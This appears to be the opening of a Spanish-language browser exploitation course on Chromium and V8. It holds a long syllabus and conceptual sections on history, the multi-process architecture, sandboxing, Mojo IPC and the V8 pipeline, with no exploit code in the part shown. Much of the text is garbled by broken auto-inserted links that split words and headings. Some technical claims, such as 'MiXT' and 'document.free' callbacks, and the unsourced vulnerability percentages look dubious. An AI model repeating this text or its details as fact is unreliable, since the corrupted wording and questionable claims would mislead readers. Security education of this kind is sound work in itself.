# browser [exploitation](./raw/br0ws3r — Explotación de navegadores

> **Nivel:** Intermedio/Avanzado > **Requisitos:** C, C++, JavaScript, [asm](../raw/4ss3mbly-f0r-h4ck3rs.md) [x64](../raw/4ss3mbly-f0r-h4ck3rs.md#x64), debugger > **Arquitecturas:** [x64](../raw/4ss3mbly-f0r-h4ck3rs.md#x64), ARM64 > **Sistemas:** Linux, Windows

---

## Índice

> ⏱️ **Tiempo estimado:** 30 horas (~6 sesiones) (2936 lineas)


1. Introducción a la Explotación de navegadorr 1.1. ¿Qué es browser [exploitation](./raw/br0ws3r 1.2. Historia y Evolución 1.3. Panorama Actual de vulnerabilidades)es 1.4. Aplicaciones: [ctf](../raw/ctf-h4ckth3b0x.md), [bug bounty](../raw/b9g-b09nty.md), [red team](../raw/r3d-t34m-1nfr4.md) 1.5. Ética y Legalidad

2. Arquitectura de Navegadores Modernos 2.1. Arquitectura Multi-[proceso](../raw/0s-f0nd4m3nt0s.md#procesos) 2.1.1. Browser Process ([proceso](../raw/0s-f0nd4m3nt0s.md#procesos) Principal) 2.1.2. Renderer Process 2.1.3. GPU Process 2.1.4. Network Process 2.1.5. Utility Processes 2.2. Modelo de Aislamiento 2.2.1. Sandbox del Renderer 2.2.2. Site Isolation 2.2.3. Procesos por Marco (iframe) 2.2.4. Policy Engine ([android](../raw/4db-d33p-d1v3.md)/Linux) 2.3. comunicación Inter-Procesos (IPC) 2.3.1. Mojo IPC en Chromium 2.3.2. Interfaces Mojo 2.3.3. Pipe/Message Passing 2.4. Ciclo de Vida de una Página Web 2.4.1. Navegación 2.4.2. Parseo HTML/CSS 2.4.3. Ejecución de JavaScript 2.4.4. Renderizado y Composición 2.4.5. Destrucción y Limpieza

3. El Motor [v8](../raw/br0ws3r-3xpl01t4t10n.md#v8) de JavaScript 3.1. Arquitectura General de [v8](../raw/br0ws3r-3xpl01t4t10n.md#v8) 3.1.1. Componentes Principales 3.1.2. [pipeline](../raw/c1cd-h4ck1ng.md#pipeline) de Compilación 3.2. Ignition — Intérprete 3.2.1. Bytecode de [v8](../raw/br0ws3r-3xpl01t4t10n.md#v8) 3.2.2. Estructura de un Bytecode 3.2.3. Registro Virtual y Acumulador 3.2.4. Feedback Vector (Feedback Vector Slots) 3.3. TurboFan — [compilador](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#compiladores) [jit](../raw/br0ws3r-3xpl01t4t10n.md#jit) Optimizador 3.3.1. Sea of Nodes IR 3.3.2. Fases de Compilación 3.3.3. Especulación y Deoptimización 3.3.4. Typer y Range Analysis 3.3.5. Simplified Lowering 3.3.6. Escape Analysis 3.4. Sparkplug — [compilador](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#compiladores) [jit](../raw/br0ws3r-3xpl01t4t10n.md#jit) No-Optimizador 3.4.1. Rol de Sparkplug 3.4.2. Diferencias con TurboFan 3.5. Maglev — [compilador](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#compiladores) [jit](../raw/br0ws3r-3xpl01t4t10n.md#jit) Mid-Tier 3.5.1. Cuándo se Activa 3.5.2. Optimizaciones Parciales 3.6. Garbage Collection en [v8](../raw/br0ws3r-3xpl01t4t10n.md#v8) 3.6.1. Generational GC 3.6.2. Young Generation (Semi-Space, From/To) 3.6.3. Old Generation (Mark-Sweep, Mark-Compact) 3.6.4. Incremental Marking 3.6.5. Concurrent y Parallel GC 3.6.6. Memory Pools y Object Allocation 3.6.7. Weak References y FinalizationRegistry 3.7. Representación de Objetos en Memoria 3.7.1. HeapObject y Tagged Pointers 3.7.2. Map (Hidden Class / Meta-Object) 3.7.3. Structure del Map 3.7.4. In-object Properties 3.7.5. Properties y Elements Backing Stores 3.7.6. Fast vs Dictionary Properties 3.8. Inline Cache (IC) 3.8.1. IC Slots en Feedback Vector 3.8.2. Megamorphic vs Monomorphic 3.8.3. IC Caching de Propiedades 3.9. Arrays y ArrayBuffers 3.9.1. Contextura de un Array (JSArray) 3.9.2. ElementsKind (PACKED_SMI, PACKED_DOUBLE, PACKED_ELEMENTS, HOLEY_*) 3.9.3. ArrayBuffer Backing Store 3.9.4. Typed Arrays y DataViews 3.10. Wasm (Webassembly) en [v8](../raw/br0ws3r-3xpl01t4t10n.md#v8) 3.10.1. Liftoff ([compilador](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#compiladores) Rápido) 3.10.2. TurboFan Wasm 3.10.3. Memoria Lineal de Wasm 3.10.4. RWX Pages (W^X)

4. Vulnerabilidades Clásicas en el Motor JS 4.1. Type Confusion 4.1.1. Mecanismo de Type Confusion 4.1.2. Casos Famosos 4.1.3. Explotación de Type Confusion 4.2. JIT Compiler Bugs 4.2.1. Eliminación Incorrecta de Bounds Checking 4.2.2. Speculative Optimization Bugs 4.2.3. Range Analysis Incorrecta 4.2.4. Dead Code Elimination Agresiva 4.2.5. Escape Analysis Defectuoso 4.3. OOB (Out-of-Bounds) Access 4.3.1. OOB en Arrays 4.3.2. OOB en TypedArrays 4.3.3. OOB en ArrayBuffers 4.4. Use-After-Free (UAF) 4.4.1. UAF en Elementos DOM 4.4.2. UAF en Objetos JS 4.4.3. Race Conditions con GC 4.5. Integer Overflow/Underflow

5. Primitivas de Explotación 5.1. addrof — Address Of Object 5.1.1. Teoría de funcionamiento 5.1.2. Implementación Paso a Paso 5.1.3. Técnicas: Map Confusion, Array.length Confusion 5.2. fakeobj — Fake Object 5.2.1. Cómo Crear Objetos Falsos 5.2.2. Especificación de Map Falso 5.2.3. Construcción de un fakeobj Confiable 5.3. Arbitrary Read 5.3.1. Lectura con ArrayBuffer Corrompido 5.3.2. Lectura vía TypedArray Modificado 5.3.3. Lectura con Objetos JS Falsos 5.4. Arbitrary Write 5.4.1. Escritura vía Corrupción de ArrayBuffer 5.4.2. Escritura vía Corrupción de Propiedades 5.4.3. DataView con Backing Store Manipulado 5.5. Code Execution (Wasm RWX) 5.5.1. Wasm RWX Pages en Versiones Antiguas 5.5.2. Shellcode Injection en Wasm 5.5.3. JIT Spray (Histórico) 5.6. Arbitrary R/W Consolidado 5.6.1. Construcción de un Primitive [set](../raw/ph1sh1ng.md#social-engineering-toolkit) Completo 5.6.2. Lectura/Escritura de Memoria Arbitraria

6. DOM Related Exploitation 6.1. Modelo del DOM en Chromium 6.1.1. Representación Interna (Node, Element, HTMLElement) 6.1.2. Wrapper Objetos JS ↔ C++ 6.1.3. Referencias desde JS a Objetos C++ 6.2. Use-After-Free en el DOM 6.2.1. Ciclo de Vida de Nodos 6.2.2. Eliminación de Nodos y Referencias Colgantes 6.2.3. Event Listeners y UAF 6.2.4. Ejemplos: [cve](../raw/s3c-f0nd4m3nt0s.md#cve)-2019-13720, [cve](../raw/s3c-f0nd4m3nt0s.md#cve)-2020-6383 6.3. Mutation Observers 6.3.1. Cómo Funcionan 6.3.2. Race Conditions con MutationObserver 6.3.3. Triggering UAF via Mutations 6.4. Event Handler Exploitation 6.4.1. Event Loop y Handlers 6.4.2. Reentrada Peligrosa 6.5. Shadow DOM y Custom Elements 6.5.1. Vulnerabilidades en Custom Elements 6.5.2. Ciclo de Vida de Custom Elements

7. Sandbox Escape en Chromium 7.1. Entendiendo el Sandbox 7.1.1. Límites del Sandbox 7.1.2. Lo que el Sandbox Permite y No Permite 7.1.3. syscalls Filtradas (seccomp-bpf en Linux) 7.2. IPC y Mojo 7.2.1. Arquitectura de Mojo 7.2.2. Message Pipes 7.2.3. Data Pipes 7.2.4. Shared Buffers 7.2.5. Mojo JS Bindings 7.3. Técnicas de Sandbox Escape 7.3.1. IPC Hijacking 7.3.2. Mojo Interface Confusion 7.3.3. Abuso de Servicios Privilegiados (Network Service, GPU Service) 7.3.4. Resource Exhaustion 7.3.5. File System Access via Blob IPC 7.3.6. Abuso de File Reader API 7.4. Ejemplos Históricos de Escape 7.4.1. CVE-2019-13768 7.4.2. CVE-2020-16040 7.4.3. CVE-2021-30563 7.5. Post-Sandbox [privilege escalation](../raw/l1n9x-pr1v3sc.md) 7.5.1. Ejecución en Browser Process 7.5.2. [persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia) en el Sistema

8. Herramientas del Oficio 8.1. d8 — V8 Shell 8.1.1. Compilación de d8 8.1.2. Flags Importantes (--allow-natives-syntax, --trace-opt, --trace-deopt, --print-opt-code, --print-bytecode, --trace-turbo, --turbo-filter) 8.1.3. Debugging con d8 8.1.4. Ejercicios con d8 8.2. GDB para V8 8.2.1. Instalación y Configuración 8.2.2. GDB Init File para V8 (v8init.gdb) 8.2.3. Macros Útiles (job, jstag, jt, dla) 8.2.4. Breakpoints en Funciones Clave 8.2.5. Análisis de HeapObjects en GDB 8.3. GDBJIT 8.3.1. Plugin GDBJIT 8.3.2. Visualización de Código JITeado 8.4. rr — Record and Replay 8.4.1. Instalación de rr 8.4.2. Grabación de una Ejecución 8.4.3. Reproducción Determinista 8.4.4. Reverse-Continue (rc, rn) 8.4.5. Uso Combinado con GDB 8.4.6. rr en [exploit](../raw/m3t4spl01t.md#exploits) Development 8.5. LLDB para macOS 8.5.1. Configuración para V8 8.5.2. Comandos Útiles 8.6. BugID / [cluster](../raw/k8s-d33p-d1v3.md#cluster)-d33p-d1v3.md#[cluster](../raw/k8s-d33p-d1v3.md#cluster))-d33pFuzz 8.6.1. Cómo Funciona ClusterFuzz 8.6.2. Reproducción Local de Bugs 8.6.3. Test Cases Minimizados 8.7. Lighthouse y Chromium DevTools 8.7.1. DevTools para Research 8.7.2. Memory Tab y Heap Snapshots

9. Patch Diffing y 1-Day Analysis 9.1. Fundamentos de Patch Diffing 9.1.1. Diferencia entre Parches 9.1.2. Análisis de Commits de Chromium 9.1.3. Identificación de Zonas Afectadas 9.2. Repositorios y Fuentes 9.2.1. Chromium Gerrit (crbug.[com](../raw/w1n-s9bsyst3ms.md#com)) 9.2.2. V8 Git (chromium.googlesource.[com](../raw/w1n-s9bsyst3ms.md#com)/v8/v8) 9.2.3. Google Project Zero Blog 9.2.4. ZDI Advisories 9.3. Backport Identification 9.3.1. Cómo Identificar Backports de Seguridad 9.3.2. Merges a Ramas Estables 9.3.3. Análisis de Fechas y Mensajes de Commit 9.4. De Patch a Exploit 9.4.1. Entendiendo el Fix 9.4.2. Construyendo el Trigger Original 9.4.3. Adaptación a la Versión Vulnerable 9.5. Ejemplo Práctico: CVE-2021-21224 9.5.1. El Commit del Fix 9.5.2. Análisis del Bug 9.5.3. Trigger y Explotación

10. Análisis de CVEs Reales 10.1. CVE-2020-6418 (Type Confusion en TurboFan) 10.1.1. Descripción del Bug 10.1.2. Trigger Minimo 10.1.3. Explotación Paso a Paso 10.2. CVE-2021-21224 (OOB en V8) 10.2.1. Vulnerability Details 10.2.2. Componente Afectado: Simplified Lowering Phase 10.2.3. Trigger y Explotación 10.3. CVE-2019-13720 (UAF en AudioContext) 10.3.1. AudioContext Internals 10.3.2. Race en el Destructor 10.3.3. UAF para Arbitrary R/W 10.4. CVE-2021-30563 (Sandbox Escape via Mojo) 10.4.1. Interfaz Mojo Vulnerable 10.4.2. IPC Message Confusion 10.4.3. Post-Escape Privilege Escalation 10.5. CVE-2020-16040 (OOB via Simplified Lowering) 10.5.1. Análisis Técnico 10.5.2. Trigger 10.6. CVE-2022-2294 (WebRTC UAF) 10.6.1. WebRTC Internals 10.6.2. Race en SCTPTransport

11. Mitigaciones Modernas 11.1. V8 Sandbox 11.1.1. Cómo Funciona el V8 Sandbox 11.1.2. Heap Cage y Pointer Compression 11.1.3. Nuevas Limitaciones para Exploits 11.1.4. Bypass conocido hasta la fecha 11.2. Pointer Compression 11.2.1. Detalles Técnicos 11.2.2. Impacto en Explotación 11.3. W^X JIT (Write XOR Execute) 11.3.1. Política W^X en V8 11.3.2. Impacto en Wasm RWX Pages 11.4. Map / JSFunction Hardening 11.4.1. Protección de Maps 11.4.2. Protección de JSFunction 11.5. Control Flow Guard (CFG) 11.5.1. Cómo Funciona en Windows 11.5.2. Bypasses 11.6. Integerity Checks (V8 Heap Sandbox) 11.7. Site Isolation y Process-per-Site 11.7.1. Impacto en Fuga de Datos 11.7.2. Cross-Site Leak Prevention

12. CTF Browser Challenges 12.1. Enfoque General para CTFs 12.1.1. Categorización del Desafío 12.1.2. Identificación del Bug 12.1.3. Construcción de Primitivas 12.1.4. Obtención de la Flag 12.2. Herramientas para CTF 12.2.1. d8 Parches Custom 12.2.2. [docker](../raw/d0ck3r-f0r-h4ck3rs.md) para Aislar el Entorno 12.2.3. Scripts de Utilidad 12.3. Desafíos Tipo "Patch Diffing" 12.4. Desafíos Tipo "Bug Hunting" 12.5. Write-ups Clásicos 12.5.1. Google CTF 12.5.2. Pwn2Own 12.5.3. 0ctf/TCTF 12.5.4. PlaidCTF

13. Ejercicios Prácticos 13.1. Ejercicio: Setup del Entorno d8 13.1.1. Objetivo 13.1.2. Instrucciones Paso a Paso 13.1.3. Verificación 13.2. Ejercicio: Análisis de Bytecode 13.2.1. Objetivo 13.2.2. Código a Analizar 13.2.3. Preguntas 13.3. Ejercicio: Type Confusion con Map Transitions 13.3.1. Objetivo 13.3.2. Código de Ejemplo 13.3.3. Preguntas 13.4. Ejercicio: Construcción de addrof/fakeobj 13.4.1. Objetivo 13.4.2. Implementación Guiada 13.4.3. Verificación 13.5. Ejercicio: Análisis de Patch diffing (CVE-2020-6418) 13.5.1. Objetivo 13.5.2. Material 13.5.3. Preguntas 13.6. Ejercicio: Trigger de OOB 13.6.1. Objetivo 13.6.2. Implementación 13.7. Ejercicio: Exploit Chain Completa 13.7.1. Objetivo 13.7.2. Componentes 13.7.3. Integración

14. Referencias y Recursos 14.1. Documentación Oficial 14.2. Blogs de Seguridad 14.3. Papers Académicos 14.4. Repositorios de Exploits 14.5. Comunidades

---

## 1. Introducción a la Explotación de Navegadores

### 1.1. ¿Qué es browser [exploitation](./raw/br0ws3r

La explotación de navegadores ([browser exploitation](../raw/br0ws3r-3xpl01t4t10n.md)) es el arte y la ciencia de encontrar y explotar vulnerabilidades de seguridad en navegadores web modernos como Google Chrome, Mozilla Firefox, Microsoft Edge (Chromium), Safari (WebKit) y otros.

A diferencia de otros tipos de explotación (como los exploits para sistemas operativos), los exploits de navegadores operan dentro de un entorno altamente restringido. El [navegador](../raw/br0ws3r-3xpl01t4t10n.md) moderno es una de las piezas de software más complejas jamás creadas. Millones de líneas de código (Chromium tiene aproximadamente 30+ millones de líneas), múltiples motores de ejecución, [protocolo](../raw/r3d3s-f0nd4m3nt0s.md#protocolos-de-red)))s de [red](../raw/r3d3s-f0nd4m3nt0s.md) complejos, y un sandbox diseñado específicamente para contener código malicioso.

El objetivo final de un browser [exploit](../raw/m3t4spl01t.md#exploits) varía según el contexto:

- **[bug bounty](../raw/b9g-b09nty.md) / Programa de Recompensas:** Demostrar una cadena de explotación que permita ejecución remota de código ([rce](../raw/w3b-h4ck1ng.md#rce)) o fuga de información crítica.
- **[ctf](../raw/ctf-h4ckth3b0x.md) ([capture the flag](../raw/ctf-h4ckth3b0x.md)):** Resolver un desafío donde un navegador con una [vulnerabilidad](../raw/s3c-f0nd4m3nt0s.md#vulnerabilidades) específica debe ser explotado para leer una flag.
- **[red team](../raw/r3d-t34m-1nfr4.md) (Operaciones Ofensivas):** Comprometer un sistema objetivo a través del navegador, ya sea mediante un drive-by download o spear-[phishing](../raw/ph1sh1ng.md) con un enlace malicioso.
- **APT / Operaciones Patrocinadas por Estados:** Los exploits de navegador zero-day son armas cibernéticas de alto valor, usadas para comprometer objetivos específicos.

La cadena típica de un browser exploit tiene tres etapas:

1. **Renderer Exploit:** Código JavaScript o Webassembly que explota una vulnerabilidad en el motor [v8](../raw/br0ws3r-3xpl01t4t10n.md#v8) (o SpiderMonkey, JavaScriptCore) para lograr ejecución de código arbitrario dentro del [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) renderer.
2. **Sandbox Escape:** Una vez que tenemos ejecución en el renderer, necesitamos escapar del sandbox para ganar acceso al [sistema operativo](../raw/0s-f0nd4m3nt0s.md#sistemas-operativos). Esto se logra explotando bugs en los mecanismos IPC (Mojo, en Chromium).
3. **Post-Explotación:** Una vez fuera del sandbox, ejecutamos payloads para [persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia), [escalada de privilegios](../raw/l1n9x-pr1v3sc.md), exfiltración de datos, etc.

### 1.2. Historia y Evolución

La historia de la explotación de navegadores es fascinante y refleja la evolución de la seguridad web:

- **2000-2008 (Era Pre-Sandbox):** No existía sandbox. Los exploits de navegador daban directamente acceso al sistema. Ejemplos: buffer overflows en ActiveX, plugins de IE. Cualquier vulnerabilidad en el motor de renderizado se traducía directamente en RCE completo.

- **2008-2012 (Nacimiento del Sandbox):** Google Chrome introdujo el sandbox en 2008. Esto cambió el juego. Ahora un exploit necesitaba dos etapas: renderer + sandbox escape. V8 fue diseñado desde cero con seguridad en mente.

- **2012-2016 (Madurez de [jit](../raw/br0ws3r-3xpl01t4t10n.md#jit) Exploitation):** El [jit](../raw/br0ws3r-3xpl01t4t10n.md#jit) (Just-In-Time) compiler se convirtió en un vector de ataque principal. Google Project Zero publicó investigaciones detalladas. Técnicas como [jit](../raw/br0ws3r-3xpl01t4t10n.md#jit) Spraying (inyección de shellcode vía [jit](../raw/br0ws3r-3xpl01t4t10n.md#jit)) fueron descubiertas y luego mitigadas.

- **2016-2020 (Mitigaciones y Contramedidas):** W^X (Write XOR Execute) para páginas JIT, CFG (Control Flow Guard), INTEL CET, pointer compression, site isolation, mitigaciones de V8 como Map hardening.

- **2020-2024 (Era V8 Sandbox):** Google introdujo el V8 Sandbox (también llamado V8 Heap Sandbox) aislado el heap del proceso. Se añadieron nuevas capas de protección como MiXT (Memory Isolation eXTensions). Los exploits modernos deben navegar múltiples capas de mitigación.

### 1.3. Panorama Actual de Vulnerabilidades

Hoy en día, las vulnerabilidades más comunes en navegadores incluyen:

| Tipo | Porcentaje | Dificultad de Explotación |
|------|-----------|---------------------------|
| Type Confusion en JIT | ~30% | Media-Alta |
| UAF en DOM/Web APIs | ~25% | Media |
| OOB en V8 | ~15% | Alta |
| Integer Bugs | ~10% | Media |
| Sandbox Escape | ~10% | Muy Alta |
| Otros | ~10% | [variable](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#variables) |

Los programas de recompensas de Google (Chrome Vulnerability Rewards Program) y Microsoft (Edge Bounty) ofrecen desde $5,000 hasta $150,000+ por exploits completos (full chain con sandbox escape).

### 1.4. Aplicaciones: CTF, Bug Bounty, Red Team

**Bug Bounty:** Los exploits de navegador son de los más valorados. Una full chain RCE para Chrome puede valer $100,000+. Empresas como ZDI (Zero Day Initiative) compran exploits de navegador por sumas significativas.

**CTF:** Desafíos de browser exploitation requieren:
- Conocimientos profundos de V8
- Capacidad para leer y entender patches
- Habilidad para construir primitivas de memoria con JavaScript
- Creatividad para sortear mitigaciones

**Red Team:** Los exploits de navegador se usan en operaciones ofensivas como vectores de entrega inicial. Herramientas como [cobalt strike](../raw/r3d-t34m-1nfr4.md#cobalt-strike) pueden integrar exploits de navegador para la fase de spear-phishing.

### 1.5. Ética y Legalidad

La explotación de navegadores es un campo que requiere responsabilidad:
- **Bug Bounty:** Solo en programas autorizados.
- **CTF:** Solo en entornos controlados.
- **Research:** Divulgación responsable (coordinated disclosure).
- **Legal:** En Argentina, la Ley 26.904 (Delitos Informáticos) penaliza el acceso ilegítimo a sistemas. Solo practicar en sistemas propios o con autorización explícita.

---

## 2. Arquitectura de Navegadores Modernos

### 2.1. Arquitectura Multi-[proceso](../raw/0s-f0nd4m3nt0s.md#procesos)

Los navegadores modernos no son un solo programa monolítico. Chromium (y por extensión Chrome, Edge, Brave, Opera) usa una arquitectura multi-proceso. Esto es fundamental para la seguridad, estabilidad y rendimiento.

#### 2.1.1. Browser Process (Proceso Principal)

El browser process es el proceso maestro. Es el que tiene acceso completo al [sistema operativo](../raw/0s-f0nd4m3nt0s.md#sistemas-operativos). Sus responsabilidades incluyen:

- **Gestión de ventanas:** Crear y administrar ventanas del [navegador](../raw/br0ws3r-3xpl01t4t10n.md).
- **Interfaz de usuario:** Barra de direcciones, botones, menús, etc.
- **Gestión de archivos:** Acceso al [sistema de archivos](../raw/0s-f0nd4m3nt0s.md#sistema-de-archivos) (descargas, guardar páginas).
- **[red](../raw/r3d3s-f0nd4m3nt0s.md):** Conexiones de [red](../raw/r3d3s-f0nd4m3nt0s.md) de alto nivel (aunque hay un network process separado desde M76+).
- **Coordinación:** Crear y administrar todos los demás procesos.

El browser process no ejecuta código de páginas web. Esto es clave para la seguridad: incluso si un atacante compromete completamente el renderer, no tiene acceso directo a las capacidades del browser process.

#### 2.1.2. Renderer Process

Cada pestaña (o en algunos casos, cada iframe de origen cruzado) tiene su propio renderer process. Dentro del renderer process ocurre:

- **Parseo de HTML/CSS**
- **Ejecución de JavaScript** (vía [v8](../raw/br0ws3r-3xpl01t4t10n.md#v8))
- **Renderizado** (Blink engine)
- **Composición** (compositing)

El renderer process está sandboxed. No puede:
- Acceder directamente al sistema de archivos
- Crear ventanas del sistema
- Ejecutar procesos arbitrarios
- Leer inputs del usuario fuera de la página

Todo acceso a recursos del sistema debe pasar por IPC al browser process, que aplica políticas de seguridad.

#### 2.1.3. GPU Process

El GPU process maneja todas las operaciones de gráficos. Separar el GPU process del renderer y del browser process:

- **Aíslala el GPU [driver](../raw/k3rn3l-h4ck1ng.md#windows-drivers):** Los drivers de GPU son notoriamente propensos a bugs.
- **Mejora la estabilidad:** Si el GPU process crashea, el navegador no se cae.
- **Permite compartición de recursos GPU entre procesos.**

#### 2.1.4. Network Process

Desde Chrome 76, las operaciones de red se manejan en un proceso separado. Esto incluye:

- [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns) resolution
- Conexiones [http](../raw/r3d3s-f0nd4m3nt0s.md#http)/[https](../raw/r3d3s-f0nd4m3nt0s.md#https)/QUIC
- WebSocket
- Caché de disco
- [proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy) configuration

Network process también está sandboxed, pero con acceso a ciertos recursos de red que el renderer no tiene.

#### 2.1.5. Utility Processes

Processes adicionales para tareas específicas:
- **Audio Service:** Maneja salida de audio.
- **CDM (Content Decryption Module):** Para DRM como Widevine.
- **Storage Service:** Maneja almacenamiento local (IndexedDB, localStorage).
- **Crashpad:** Servicio de reporte de crashes.

### 2.2. Modelo de Aislamiento

#### 2.2.1. Sandbox del Renderer

El sandbox del renderer es el mecanismo de seguridad más importante de Chromium. funciona a nivel de sistema operativo:

**En Linux (seccomp-bpf):**
```c
// Ejemplo conceptual de filtro seccomp
struct sock_filter filter = { // Permitir leer, escribir, cerrar sockets ALLOW(syscall_read), ALLOW(syscall_write), ALLOW(syscall_close), // Bloquear fork, execve DENY(syscall_fork), DENY(syscall_execve), // Bloquear acceso directo a archivos DENY(syscall_openat), // Bloquear creación de procesos DENY(syscall_clone), // Default: kill process KILL,
};
```

**En Windows (Job Objects + Desktop Restrictions):**
- El renderer corre en un Job Object con restricciones
- No puede crear ventanas
- Limitaciones en el desktop (alternate desktop, sin acceso al interactive desktop)
- Token de acceso restringido

**En macOS (Sandbox + Seatbelt):**
- Perfil de sandbox específico para el renderer
- Restricciones en mach ports
- Sin acceso al sistema de archivos del usuario

#### 2.2.2. Site Isolation

Site Isolation es una de las mitigaciones más importantes introducidas post-Spectre. En lugar de compartir un proceso entre diferentes sitios web, cada sitio (eTLD+1) tiene su propio proceso.

Esto previene ataques de tipo:
- **Spectre (leer memoria cross-origin)**
- **Side-channel leaks entre pestañas**
- **XS-Leaks**

Cada iframe de origen cruzado puede tener su propio renderer process. La comunicación entre procesos para iframes se maneja vía IPC, con verificación de origen.

#### 2.2.3. Procesos por Marco (iframe)

Cuando una página contiene un iframe de un origen diferente, Chromium puede:
1. Asignar un renderer process separado para el iframe (site isolation completo)
2. O renderizar el iframe en el mismo proceso pero parchear las referencias

La opción 1 es más segura pero consume más memoria. La opción 2 se usa en dispositivos con recursos limitados.

### 2.3. Comunicación Inter-Procesos (IPC)

#### 2.3.1. Mojo IPC en Chromium

Mojo es el sistema IPC de Chromium. Reemplazó a los viejos métodos de IPC ([legacy](../raw/l3g4cy-3nt3rpr1s3.md) IPC) con un sistema moderno basado en:

- **MessagePipes:** Canales bidireccionales para paso de mensajes.
- **DataPipes:** Canales para datos en streaming.
- **SharedBuffers:** Memoria compartida mapeada.

Mojo usa interfaces definidas en archivos `.mojom`. Por ejemplo:

```mojom
// network_service.mojom
interface NetworkService { CreateURLLoader(pending_receiver<URLLoader> receiver);
};

interface URLLoader { Start(URLRequest request); FollowRedirect;
};

interface URLLoaderClient { OnReceiveResponse(URLResponseHead response); OnStartLoadingResponseBody(handle<data_pipe_consumer> body);
};
```

#### 2.3.2. Interfaces Mojo

Cada servicio expone interfaces Mojo. Por ejemplo:

- `NetworkService` → `URLLoaderFactory` → `URLLoader` / `URLLoaderClient`
- `StorageService` → `FileSystemAccess`
- `WebBlobService` → `BlobReader` / `BlobWriter`
- `MediaService` → `MediaPlayer`

Desde el renderer, el JS puede invocar operaciones que terminan llamando a interfaces Mojo en el browser process (después de pasar por múltiples capas de seguridad).

#### 2.3.3. Pipe / Message Passing

Cada mensaje IPC pasa por:
1. **Serialización:** Los argumentos se serializan en un buffer plano.
2. **Policy Check:** Se verifica si el mensaje está permitido por las políticas.
3. **[kernel](../raw/0s-f0nd4m3nt0s.md#kernel):** El mensaje viaja via pipe/socket.
4. **Deserialización:** El receptor reconstruye el mensaje.

Un [exploit](../raw/m3t4spl01t.md#exploits) de sandbox escape busca bugs en alguna de estas capas, especialmente en la serialización/deserialización de estructuras complejas.

### 2.4. Ciclo de Vida de una Página Web

#### 2.4.1. Navegación

1. El usuario escribe una URL en la omnibox.
2. El browser process recibe la solicitud.
3. Browser process pide al network process que resuelva DNS y haga la solicitud HTTP.
4. Network process envía respuesta (HTML) al browser process.
5. Browser process selecciona/crea un renderer process.
6. Renderer process recibe el HTML y comienza a parsear.

#### 2.4.2. Parseo HTML/CSS

El renderer process:
1. Parseo del HTML → DOM Tree (documento de objetos)
2. Parseo del CSS → CSSOM (CSS Object Model)
3. Construcción del Render Tree (combinación de DOM + CSSOM)
4. Layout (cálculo de geometría de cada elemento)
5. Paint (dibujado de cada capa)
6. Compositing (combinación de capas en la imagen final)

#### 2.4.3. Ejecución de JavaScript

Cuando el parser HTML encuentra una etiqueta `<script>`:
1. Si el script es externo, se descarga.
2. El código JS se pasa a V8 para compilación.
3. V8 lo compila (Ignition/TurboFan) y ejecuta.
4. La ejecución puede modificar el DOM (vía APIs), lanzar eventos, etc.

#### 2.4.4. Renderizado y Composición

El [pipeline](../raw/c1cd-h4ck1ng.md#pipeline) de renderizado es:
```
Parse HTML → Parse CSS → Layout → Paint → Compositing → Display
```

Si JS modifica el DOM, el pipeline se repite (reflow/repaint).

#### 2.4.5. Destrucción y Limpieza

Cuando se cierra una pestaña (o se navega a una URL diferente):
1. V8 recibe un callback: se disparan los `document.free` internos.
2. GC marca objetos del contexto viejo.
3. En JS, pueden dispararse `beforeunload`, `unload`, `pagehide`, `visibilitychange`.
4. Todas las referencias al documento se invalidan.

Es en esta transición donde ocurren muchos UAF.

---

## 3. El Motor [v8](../raw/br0ws3r-3xpl01t4t10n.md#v8) de JavaScript

### 3.1. Arquitectura General de V8

V8 es el motor de JavaScript de código abierto desarrollado por Google, escrito en C++. Es el motor que usa Chromium, Node.js, Deno, Electron, y muchos otros proyectos.

V8 implementa ECMAScript y Webassemblymbly-f0r Su diseño se centra en:
- **Rendimiento:** V8 es uno de los motores JS más rápidos.
- **Eficiencia de memoria:** Optimizaciones constantes.
- **Seguridad:** Capas de mitigación contra exploits.

```javascript
// Esto eventualmente pasa por V8
function suma(a, b) { return a + b;
}
```

#### 3.1.1. componentes Principales

- **Parser:** Convierte texto fuente JS en AST (Abstract Syntax Tree).
- **Ignition:** Intérprete de bytecode.
- **Sparkplug:** [compilador](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#compiladores) no-optimizado. Convierte bytecode a código máquina sin mucha optimización.
- **Maglev:** Compilador mid-tier (introducido en V8 12.0+). Optimizaciones parciales.
- **TurboFan:** Compilador [jit](../raw/br0ws3r-3xpl01t4t10n.md#jit) optimizador. Produce código altamente optimizado.
- **Orinoco:** Garbage Collector.
- **Runtime:** funciones implementadas en C++ que V8 llama desde JS.

#### 3.1.2. pipelineline) de Compilación

```
Source Code (JS) ↓
Parser → AST ↓
Ignition → Bytecode ↓
Sparkplug → Código máquina (no optimizado) ↓
[Profiling / Feedback Vector] ↓
Maglev → Código optimizado (mid-tier) ↓
[Profiling continúa] ↓
TurboFan → Código altamente optimizado ↓
[Deoptimización si las suposiciones son incorrectas]
```

### 3.2. Ignition — Intérprete

Ignition es el intérprete de bytecode de V8. Traduce el AST a bytecode, que es más compacto que el AST (reduce memoria) y más rápido de interpretar.

#### 3.2.1. Bytecode de V8

El bytecode de V8 es un bytecode de registro virtual (accumulator-based). Las instrucciones operan sobre un accumulator implícito y registros virtuales.

Ejemplo de bytecode para `let x = a + b`:
```
Ldar a ; Load accumulator con 'a'
Add b ; Suma 'b' al accumulator (resultado en acc)
Star x ; Store accumulator en 'x'
```

#### 3.2.2. Estructura de un Bytecode

Cada bytecode tiene:
- **Bytecode (1 byte):** El opcode.
- **Operandos:** De 0 a 3 operandos (cada uno puede ser 1, 2 o 4 bytes).
- **Flags:** Flags adicionales (accumulator, etc).

#### 3.2.3. Registro Virtual y Acumulador

Ignition usa un modelo basado en:
- **Accumulator:** Un registro virtual implícito donde se guarda el resultado de la mayoría de operaciones.
- **Registers (r0, r1, .. rN):** Registros virtuales donde se almacenan variables locales y temporales.

La función `f(a, b) { let c = a + b; return c; }` genera estos registros:
- r0 → parámetro `a`
- r1 → parámetro `b`
